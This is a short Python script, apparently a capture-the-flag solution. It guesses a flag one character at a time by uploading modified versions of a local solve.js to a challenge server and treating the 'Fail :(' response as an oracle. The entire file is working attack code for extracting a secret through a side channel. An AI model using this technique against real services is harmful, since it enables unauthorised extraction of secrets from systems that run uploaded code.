import requests

url = 'https://pyscript.ctf.zoolab.org/'
file = open("solve.js", "r")
jscode = file.read()

known_flag = "FLAG{"
stop = False
while True:
    for c in "abcdefghijklmnopqrstuvwxyz1234567890_}":
        s = jscode.replace("FLAG{", known_flag + c)
        f = {'file': s}
        x = requests.post(url, files=f)
        if "Fail :(" in x.text:
            known_flag += c
            print(known_flag)
            if c == "}":
                stop = True
                break
    if stop:
        break